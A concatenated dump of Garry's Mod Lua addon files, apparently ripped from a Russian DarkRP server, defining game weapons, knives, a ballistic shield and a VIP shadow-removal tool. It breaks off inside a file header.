SWEP.FireDelay = 0.085
SWEP.FireSound = Sound("Alt_Weapon_AK47.1")
SWEP.Recoil = 0.4

SWEP.HipSpread = 0.04
SWEP.AimSpread = 0.005
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 20
SWEP.DeployTime = 1
--PATH addons/weaponandcontent/lua/weapons/aug/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "AUG"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(3.552, -2.895, 1.2)
	SWEP.AimAng = Vector(0.79, -0.057, 0)
	
		
	SWEP.SprintPos = Vector(-3.701, -7.008,0)
	SWEP.SprintAng = Vector(-10.197, -63.111, -4.134)
	
	SWEP.ViewModelMovementScale = 1.15
	
	SWEP.DrawBlackBarsOnAim = true
	SWEP.AimOverlay = surface.GetTextureID("swb/scope_rifle")
	SWEP.FadeDuringAiming = true
	SWEP.MoveWepAwayWhenAiming = true
	SWEP.ZoomAmount = 50
	SWEP.DelayedZoom = true
	SWEP.SnapZoom = true
	SWEP.SimulateCenterMuzzle = true
	
	SWEP.IconLetter = "e"
	--killicon.AddFont("swb_aug", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_rifle_med"
end

SWEP.PlayBackRate = 1
SWEP.PlayBackRateSV = 1
SWEP.FadeCrosshairOnAim = false
SWEP.PreventQuickScoping = true

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true

SWEP.SpeedDec = 25
SWEP.BulletDiameter = 5.56
SWEP.CaseLength = 45

SWEP.Slot = 4
SWEP.SlotPos = 0
SWEP.NormalHoldType = "ar2"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"auto", "semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_rif_aug.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_rif_aug.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 30
SWEP.Primary.DefaultClip	= 30
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= "ar2"

SWEP.FireDelay = 0.08
SWEP.FireSound = Sound("Alt_Weapon_AUG.1")
SWEP.Recoil = 0.45

SWEP.HipSpread = 0.053
SWEP.AimSpread = 0.0015
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 25
SWEP.DeployTime = 1
--PATH addons/m9k/lua/weapons/clt_akvlcn/shared.lua:
SWEP.Gun = ("clt_akvlcn") 
SWEP.Category				= "Clout's CSGO Weapons" 
SWEP.Author					= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions			= ""
SWEP.PrintName				= "AK-47 Vulcan"			
SWEP.Slot					= 2				
SWEP.SlotPos				= 3			
SWEP.DrawAmmo				= true		
SWEP.DrawWeaponInfoBox		= false		
SWEP.BounceWeaponIcon   	= false		
SWEP.DrawCrosshair			= true		
SWEP.Weight					= 43		
SWEP.AutoSwitchTo			= true		
SWEP.AutoSwitchFrom			= true		
SWEP.HoldType 				= "ar2"		


SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_vulakclt.mdl"	
SWEP.WorldModel				= "models/weapons/w_rif_ak47.mdl"	
SWEP.ShowWorldModel			= false
SWEP.Base					= "bobs_gun_base" 
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater 		= false

SWEP.Primary.Sound			= Sound("clt_vcln-1")		
SWEP.Primary.SilencedSound 	= Sound("")		
SWEP.Primary.RPM			= 575			
SWEP.Primary.ClipSize			= 30		
SWEP.Primary.DefaultClip		= 90		
SWEP.Primary.KickUp				= 0.3		
SWEP.Primary.KickDown			= 0.15		
SWEP.Primary.KickHorizontal		= 0.2		
SWEP.Primary.Automatic			= true		
SWEP.Primary.Ammo			= "ar2"			

SWEP.SelectiveFire		= false
SWEP.CanBeSilenced		= false

SWEP.Secondary.IronFOV			= 70			
SWEP.data 				= {}				
SWEP.data.ironsights			= 1

SWEP.Primary.Damage		= 66 -- 80	
SWEP.Primary.Spread		= .02	
SWEP.Primary.IronAccuracy = .02 

SWEP.IronSightsPos = Vector ( 4.869, -14.039, 1.769 )
SWEP.IronSightsAng = Vector ( 2.342, -0.145, 0 )

SWEP.SightsPos = Vector ( 4.869, -14.039, 1.769 )
SWEP.SightsAng = Vector ( 2.342, -0.145, 0 )

SWEP.RunSightsPos = Vector ( -5.131, 4.952, -2.37 )

SWEP.RunSightsAng = Vector ( 0, -26.59, 1.608 )


SWEP.WElements = {
	["clt_vlcn_wrld"] = { type = "Model", model = "models/weapons/w_vulakclt.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(3.444, 1.483, 0.4), angle = Angle(-12.407, 2.015, 180), size = Vector(1, 1, 1), color = Color(255, 255, 255, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} }
}



--PATH addons/grp_knife/lua/weapons/csgo_butterfly.lua:
if not file.Exists( "weapons/csgo_baseknife.lua", "LUA" ) then
  SWEP.Spawnable = false
  print( "csgo_butterfly failed to initialize: csgo_baseknife.lua not found. Did you install the main part?" )
  return
end

local TTT = ( GAMEMODE_NAME == "terrortown" or cvars.Bool("csgo_knives_force_ttt", false) )

DEFINE_BASECLASS( "csgo_baseknife" )

if ( SERVER ) then
  SWEP.Weight         = 5
  SWEP.AutoSwitchTo   = false
  SWEP.AutoSwitchFrom = false

  if TTT then
    SWEP.EquipMenuData = nil
  end
end

if ( CLIENT ) then
  SWEP.Slot         = TTT and 6 or 2
  SWEP.SlotPos      = 0
end

SWEP.PrintName      = "Butterfly Knife"
SWEP.Category       = "CS:GO Knives"

SWEP.Spawnable      = true
SWEP.AdminSpawnable = true

SWEP.ViewModel      = "models/weapons/v_csgo_butterfly.mdl"
SWEP.WorldModel     = "models/weapons/w_csgo_butterfly.mdl"

SWEP.SkinIndex      = 0
SWEP.PaintMaterial  = nil
SWEP.AreDaggers     = false

util.PrecacheModel( SWEP.ViewModel )
util.PrecacheModel( SWEP.WorldModel )

-- TTT config values

-- Kind specifies the category this weapon is in. Players can only carry one of
-- each. Can be: WEAPON_... MELEE, PISTOL, HEAVY, NADE, CARRY, EQUIP1, EQUIP2 or ROLE.
-- Matching SWEP.Slot values: 0      1       2     3      4      6       7        8
SWEP.Kind = WEAPON_EQUIP

-- If AutoSpawnable is true and SWEP.Kind is not WEAPON_EQUIP1/2, then this gun can
-- be spawned as a random weapon.
SWEP.AutoSpawnable = false

-- The AmmoEnt is the ammo entity that can be picked up when carrying this gun.
-- SWEP.AmmoEnt = "item_ammo_smg1_ttt"

-- CanBuy is a table of ROLE_* entries like ROLE_TRAITOR and ROLE_DETECTIVE. If
-- a role is in this table, those players can buy this.
SWEP.CanBuy = nil

-- InLoadoutFor is a table of ROLE_* entries that specifies which roles should
-- receive this weapon as soon as the round starts. In this case, none.
SWEP.InLoadoutFor = nil

-- If LimitedStock is true, you can only buy one per round.
SWEP.LimitedStock = false

-- If AllowDrop is false, players can't manually drop the gun with Q
SWEP.AllowDrop = true

-- If IsSilent is true, victims will not scream upon death.
SWEP.IsSilent = true

-- If NoSights is true, the weapon won't have ironsights
SWEP.NoSights = true

-- This sets the icon shown for the weapon in the DNA sampler, search window,
-- equipment menu (if buyable), etc.
SWEP.Icon = "vgui/entities/csgo_butterfly.vmt"

--PATH addons/grp_knife/lua/weapons/csgo_karambit_tiger.lua:
if not file.Exists( "weapons/csgo_baseknife.lua", "LUA" ) then
  SWEP.Spawnable = false
  print( "csgo_karambit_tiger failed to initialize: csgo_baseknife.lua not found. Did you install the main part?" )
  return
end

local TTT = ( GAMEMODE_NAME == "terrortown" or cvars.Bool("csgo_knives_force_ttt", false) )

DEFINE_BASECLASS( "csgo_baseknife" )

if ( SERVER ) then
  SWEP.Weight         = 5
  SWEP.AutoSwitchTo   = false
  SWEP.AutoSwitchFrom = false

  if TTT then
    SWEP.EquipMenuData = nil
  end
end

if ( CLIENT ) then
  SWEP.Slot         = TTT and 6 or 2
  SWEP.SlotPos      = 0
end

SWEP.PrintName      = "Karambit Knife" .. " | " .. "Tiger Tooth"
SWEP.Category       = "CS:GO Knives"

SWEP.Spawnable      = true
SWEP.AdminSpawnable = true

SWEP.ViewModel      = "models/weapons/v_csgo_karambit.mdl"
SWEP.WorldModel     = "models/weapons/w_csgo_karambit.mdl"

SWEP.SkinIndex      = 9
SWEP.PaintMaterial  = nil
SWEP.AreDaggers     = false

util.PrecacheModel( SWEP.ViewModel )
util.PrecacheModel( SWEP.WorldModel )

-- TTT config values

-- Kind specifies the category this weapon is in. Players can only carry one of
-- each. Can be: WEAPON_... MELEE, PISTOL, HEAVY, NADE, CARRY, EQUIP1, EQUIP2 or ROLE.
-- Matching SWEP.Slot values: 0      1       2     3      4      6       7        8
SWEP.Kind = WEAPON_EQUIP

-- If AutoSpawnable is true and SWEP.Kind is not WEAPON_EQUIP1/2, then this gun can
-- be spawned as a random weapon.
SWEP.AutoSpawnable = false

-- The AmmoEnt is the ammo entity that can be picked up when carrying this gun.
-- SWEP.AmmoEnt = "item_ammo_smg1_ttt"

-- CanBuy is a table of ROLE_* entries like ROLE_TRAITOR and ROLE_DETECTIVE. If
-- a role is in this table, those players can buy this.
SWEP.CanBuy = nil

-- InLoadoutFor is a table of ROLE_* entries that specifies which roles should
-- receive this weapon as soon as the round starts. In this case, none.
SWEP.InLoadoutFor = nil

-- If LimitedStock is true, you can only buy one per round.
SWEP.LimitedStock = false

-- If AllowDrop is false, players can't manually drop the gun with Q
SWEP.AllowDrop = true

-- If IsSilent is true, victims will not scream upon death.
SWEP.IsSilent = true

-- If NoSights is true, the weapon won't have ironsights
SWEP.NoSights = true

-- This sets the icon shown for the weapon in the DNA sampler, search window,
-- equipment menu (if buyable), etc.
SWEP.Icon = "vgui/entities/csgo_karambit_tiger.vmt"

--PATH gamemodes/sandbox/entities/weapons/gmod_tool/stools/shadowremover.lua:
-----------------------------------------------------------------------------
--
--      © 2020 Rylund Development (info@rylund.dev) - All Rights Reserved
--
-----------------------------------------------------------------------------

TOOL.Category = "VIP"
TOOL.Author = "SnowredWolf"
TOOL.Name = "#tool.shadowremover.name"
TOOL.Desc = "#tool.shadowremover.desc"
TOOL.ConfigName = ""

shadowremovertool = {}
shadowremovertool.proplist = shadowremovertool.proplist or {}

local allowedTypes = {
	['prop_physics'] = true,
	['prop_ragdoll'] = true
}

if SERVER then
	util.AddNetworkString("RemovePropShadow")
	util.AddNetworkString("AddPropShadow")
	util.AddNetworkString("UpdateStateShodows")
end


if CLIENT then
	TOOL.Information = {
		{ name = "info", stage = 1 },
		{ name = "left" },
		{ name = "right" },
		{ name = "reload"}
	}

	language.Add("tool.shadowremover.name", "Управление тенями")
	language.Add("tool.shadowremover.left", "Убрать тень")
	language.Add("tool.shadowremover.right", "Добавить тень")
	language.Add("tool.shadowremover.reload", "Восстановить тень")
	language.Add("tool.shadowremover.desc", "Использовать для работы с тенями!")
end


-----------------------------------------------------------------------------
-- Handle what happens when using left click
-----------------------------------------------------------------------------
	function TOOL:LeftClick(trace)
		local ent = trace.Entity
		if not IsEntity(ent) or not allowedTypes[ent:GetClass()] then return false end
		if CLIENT then return true end
		
		local ply = self:GetOwner()
		if ( ply:GetUserGroup() == "user") then DarkRP.notify(ply, 1, 4, "Вы должны быть VIP и выше!") return false end
			shadowremovertool.removepropshadow(ent)
		return true
	end

-----------------------------------------------------------------------------
-- Handle what happens when using right click
-----------------------------------------------------------------------------
	function TOOL:RightClick(trace)
		local ent = trace.Entity
		if not IsEntity(ent) or not allowedTypes[ent:GetClass()] then return false end
		if CLIENT then return true end
		
		local ply = self:GetOwner()
		if ( ply:GetUserGroup() == "user") then DarkRP.notify(ply, 1, 4, "Вы должны быть VIP и выше!") return false end
			shadowremovertool.addpropshadows(ent)
		return true
	end


-----------------------------------------------------------------------------
-- Handle what happens when pressing reload
-----------------------------------------------------------------------------
	function TOOL:Reload(trace)
		local ent = trace.Entity
		if ent.originalcolor then  -- Ensure originalcolor exists
			_, _, ent.v = ColorToHSV(ent.originalcolor)
			ent:SetColor(ent.originalcolor)
		end
		return true
	end

-----------------------------------------------------------------------------
-- Serverside functions to handle shadows
-----------------------------------------------------------------------------
	if SERVER then
		local colnew
		local h, s, v
		local entcolor

		function shadowremovertool.removepropshadow(ent)
			if shadowremovertool.proplist[ent] then return false end
			shadowremovertool.proplist[ent] = true
			ent.originalcolor = ent:GetColor()
			_, _, ent.v = ColorToHSV(ent.originalcolor)
			net.Start("RemovePropShadow")
				net.WriteEntity(ent)
			net.Broadcast()

			return true
		end

		function shadowremovertool.addpropshadows(ent)
			if not shadowremovertool.proplist[ent] then return false end
			shadowremovertool.proplist[ent] = nil
			ent:SetColor(ent.originalcolor)
			ent.originalcolor = nil
			ent.v = nil

			net.Start("AddPropShadow")
				net.WriteEntity(ent)
			net.Broadcast()
		end

		timer.Create("CheckPropShadowVisibility", 5, 0, function()
			local proplist = {}
			for ent, _ in pairs(shadowremovertool.proplist) do
				if type(ent) == "Entity" and IsValid(ent) then
					proplist[ent] = true
				end
			end
			
			shadowremovertool.proplist = proplist or {}
			
			-- Отправка списка пропов без теней игрокам
			net.Start("UpdateStateShodows")
				net.WriteTable(proplist)
			net.Broadcast()
		end)
	
	end

-----------------------------------------------------------------------------
-- Clientside networking
-----------------------------------------------------------------------------
	net.Receive("RemovePropShadow", function()
		local ent = net.ReadEntity()
		ent.RenderOverride = function(self) render.SuppressEngineLighting(true) self:DrawModel() render.SuppressEngineLighting(false) end
	end)

	net.Receive("AddPropShadow", function()
		local ent = net.ReadEntity()
		ent.RenderOverride = function(self) self:DrawModel() end
	end)

	-- Клиентская обработка для установки RenderOverride
	net.Receive("UpdateStateShodows", function()
		local proplist = net.ReadTable()
		for _, ent in ipairs(proplist) do
			if IsValid(ent) then
				ent.RenderOverride = function(self) 
					render.SuppressEngineLighting(true) 
					self:DrawModel() 
					render.SuppressEngineLighting(false) 
				end
			end
		end
	end)
--PATH addons/cp_ballistic_shields/lua/weapons/heavy_shield/shared.lua:
if SERVER then 
	include( "ballistic_shields/sh_bs_util.lua" ) 
	include( "ballistic_shields/sv_bs_util.lua" ) 
end
include( "bs_config.lua" ) 
include( "ballistic_shields/sh_bs_lang.lua" ) 

SWEP.PrintName = "Щит"
SWEP.Author	= "D3G"
SWEP.Instructions = "LMB - Breach door | RMB - Toggle visibility"
SWEP.Spawnable = true
SWEP.AdminOnly = true

SWEP.ViewModel = ""
SWEP.WorldModel = "models/bshields/hshield.mdl"

SWEP.AutoSwitchTo = false
SWEP.AutoSwitchFrom	= false

SWEP.Slot = 5
SWEP.SlotPos = 0
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = false

SWEP.Category = "Ballistic shields"
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"
SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.CanVisToggle = true
SWEP.VisToggle = false
SWEP.HitDistance = 55

local SwingSound = Sound( "WeaponFrag.Throw" )
local HitSound = Sound( "Flesh.ImpactHard" )

function SWEP:Initialize()
	self:SetHoldType("melee2")
end

function SWEP:DrawWorldModel()
	self:SetNoDraw( true ) 
end

local function bsGetHoldType(ply)
	if (ply:LookupAttachment( "anim_attachment_RH" )>0) then return {1,"anim_attachment_RH"} end
	if (ply:LookupAttachment( "forward" )>0) then return {2,"forward"} end
	return {3, "anim_attachment_head"}
end

local ShieldIcon = Material("bshields/ui/heavy_shield", "smooth")
local BackgroundIcon = Material("bshields/ui/background")
function SWEP:DrawHUD()
	if(bshields.config.disablehud) then return end
	surface.SetDrawColor(255,255,255,200)	
	surface.SetMaterial(BackgroundIcon)
	surface.DrawTexturedRect( ScrW()/2-ScrH()/10, ScrH()/2-ScrH()/30+ScrH()/3, ScrH()/5, ScrH()/15)

	local aim = LocalPlayer():GetAimVector()
	local tr = util.TraceLine( {
		start  = LocalPlayer():GetShootPos() ,
		endpos = LocalPlayer():GetShootPos() + aim * 70,
		filter = LocalPlayer()
	} )
	surface.SetDrawColor(255,255,255,125)
	if(!IsValid(tr.Entity) || !DarkRP || !(tr.Entity:isDoor())) then
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].hshieldprim, "bshields.HudFont", ScrW()/2-ScrH()/32, ScrH()/2-ScrH()/28+ScrH()/3+ScrH()/22, Color( 255, 255, 255, 25 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(20,20,20,255)) 
	else
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].hshieldprim, "bshields.HudFont", ScrW()/2-ScrH()/32, ScrH()/2-ScrH()/28+ScrH()/3+ScrH()/22, Color( 255, 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(20,20,20,255)) 
	end
	surface.SetMaterial(ShieldIcon)
	surface.DrawTexturedRect( ScrW()/2-ScrH()/10.2, ScrH()/2-ScrH()/32+ScrH()/3, ScrH()/16, ScrH()/16) 
	if(self.VisToggle) then
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].sec, "bshields.HudFont", ScrW()/2-ScrH()/32, ScrH()/2-ScrH()/28+ScrH()/3+ScrH()/48, Color( 255, 255, 255, 25 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(20,20,20,255)) 
	else
		draw.SimpleTextOutlined( bshields.lang[bshields.config.language].sec, "bshields.HudFont", ScrW()/2-ScrH()/32, ScrH()/2-ScrH()/28+ScrH()/3+ScrH()/48, Color( 255, 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(20,20,20,255)) 
	end
end

function SWEP:Deploy()
	self.CanVisToggle = true
	self.VisToggle = false
	if SERVER then
		local owner = self.Owner
		local holdtype = bsGetHoldType(owner)
		bshield_remove(owner)
		owner.bs_type = 2
		owner.bs_shield = ents.Create("bs_hshield")
		owner.bs_shield:SetCollisionGroup( COLLISION_GROUP_DEBRIS  )
		owner.bs_shield:SetMoveType( MOVETYPE_NONE ) 
		owner.bs_shield:SetPos(owner:GetPos())
		owner.bs_shield:SetParent( owner, owner:LookupAttachment(holdtype[2])) 
		owner.bs_shield:SetLocalAngles( bshields.shields[holdtype[1]][1].angles ) 
		owner.bs_shield:SetLocalPos( bshields.shields[holdtype[1]][1].position ) 
		owner.bs_shield:Spawn()
		net.Start( "bs_shield_info" )
		net.WriteUInt( owner.bs_shield:EntIndex(), 16 ) 
		net.Send( owner )
	end
end

local function canRam(ply)
	return IsValid(ply) and (ply.warranted == true or ply:isWanted() or ply:isArrested())
end

function SWEP:PrimaryAttack()
end

function SWEP:SecondaryAttack()
	if CLIENT then
		if(!self.CanVisToggle) then return end
		surface.PlaySound( "weapons/smg1/switch_single.wav" )
		if(!self.VisToggle) then
			Entity(LocalPlayer().bs_shieldIndex):SetColor(Color( 0, 0, 0, 125 ))
			self.VisToggle = true
		else
			Entity(LocalPlayer().bs_shieldIndex):SetColor(Color( 255, 255, 255 ))
			self.VisToggle = false
		end
		self.CanVisToggle = false
		timer.Simple(0.1, function()
			self.CanVisToggle = true
		end)
	end
end

if CLIENT then return end

function SWEP:Holster()
	bshield_remove(self.Owner)
	return true
end
function SWEP:OnRemove()
	bshield_remove(self.Owner)
	return true
end
function SWEP:OnDrop()
	bshield_remove(self.Owner)
	return true
end
--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_util.lua:
bshields = bshields or {}
bshields.config = bshields.config or {}

bshields.shields = {
	{
		[1] = {
			["angles"] = Angle(4,6,-14),
			["position"] = Vector(0,8,-1)
		},
		[2] = {
			["angles"] = Angle(6,6,-12),
			["position"] = Vector(8,10,-4)
		},
		[3] = {
			["angles"] = Angle(-3,7,-16),
			["position"] = Vector(-1,4,-3)
		}
	},
	{
		[1] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-4,-8)
		},
		[2] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(16,-3,-12)
		},
		[3] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-3,-12)
		}
	},
	{
		[1] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-7,-13)
		},
		[2] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-6,-22)
		},
		[3] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-8,-12)
		}
	}
}

--PATH addons/m9k/lua/weapons/m9k_an94/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_an94/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_an94") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then 
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Assault Rifles"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "AN-94"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 25			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 55
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_rif_an_94.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_rif_an_94.mdl"	-- Weapon world model
SWEP.ShowWorldModel			= true
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("an94.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 600			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.3		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.1		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "SniperPenetratedRound"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 20	-- Base damage per bullet
SWEP.Primary.Spread		= .015	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .005 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.552, 0, 3.062)
SWEP.IronSightsAng = Vector(0.93, -0.5, 0)
SWEP.SightsPos = Vector(4.552, 0, 3.062)
SWEP.SightsAng = Vector(0.93, -0.5, 0)
SWEP.RunSightsPos = Vector(-5.277, -8.584, 2.598)
SWEP.RunSightsAng = Vector(-12.954, -52.088, 0)

SWEP.Primary.Burst = false

function SWEP:SelectFireMode()

	if self.Primary.Burst then
		self.Primary.Burst = false
		self.NextFireSelect = CurTime() + .5
		if CLIENT then
			self.Owner:PrintMessage(HUD_PRINTTALK, "Automatic selected.")
		end
		self.Weapon:EmitSound("Weapon_AR2.Empty")
		self.Primary.NumShots	= 1	
		self.Primary.Sound	= Sound("an94.single")
		self.Primary.Automatic = true
	else
		self.Primary.Burst = true
		self.NextFireSelect = CurTime() + .5
		if CLIENT then
			self.Owner:PrintMessage(HUD_PRINTTALK, "Burst fire selected.")
		end
		self.Weapon:EmitSound("Weapon_AR2.Empty")
		self.Primary.NumShots	= 2
		self.Primary.Sound	= Sound("an94.double")
		self.Primary.Automatic = false
	end
end

SWEP.Primary.PrevShots = SWEP.Primary.NumShots

function SWEP:PrimaryAttack()
	if self:CanPrimaryAttack() and self.Owner:IsPlayer() then
	self.ShootThese = self.Primary.NumShots
	
	if self.Primary.Burst then
		if self.Primary.NumShots > self.Owner:GetActiveWeapon():Clip1() then
			self.Primary.NumShots = 1
			self.ShootThese = 1
			self.Primary.Sound	= Sound("an94.single")
		else
			self.Primary.NumShots = 2
			self.ShootThese = 2
			self.Primary.Sound	= Sound("an94.double")
		end
	end
	
	
	if ( !self.Owner:KeyDown(IN_SPEED) or self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and !self.Owner:KeyDown(IN_RELOAD) then
		self:ShootBulletInformation()
		self.Weapon:TakePrimaryAmmo(self.ShootThese)
		
		if self.Silenced then
			self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK_SILENCED )
			self.Weapon:EmitSound(self.Primary.SilencedSound)
		else
			self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
			self.Weapon:EmitSound(self.Primary.Sound)
		end	
	
		local fx 		= EffectData()
		fx:SetEntity(self.Weapon)
		fx:SetOrigin(self.Owner:GetShootPos())
		fx:SetNormal(self.Owner:GetAimVector())
		fx:SetAttachment(self.MuzzleAttachment)
		if GetConVar("M9KGasEffect") != nil then
			if GetConVar("M9KGasEffect"):GetBool() then 
				util.Effect("m9k_rg_muzzle_rifle",fx)
			end
		end
		self.Owner:SetAnimation( PLAYER_ATTACK1 )
		self.Owner:MuzzleFlash()
		self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
		self:CheckWeaponsAndAmmo()
		if self.BoltAction then self:BoltBack() end
	end
	elseif self:CanPrimaryAttack() and self.Owner:IsNPC() then
		self:ShootBulletInformation()
		self.Weapon:TakePrimaryAmmo(self.ShootThese)
		self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
		self.Weapon:EmitSound(self.Primary.Sound)
		self.Owner:SetAnimation( PLAYER_ATTACK1 )
		self.Owner:MuzzleFlash()
		self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
	end
end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_m4a1/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_m4a1/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
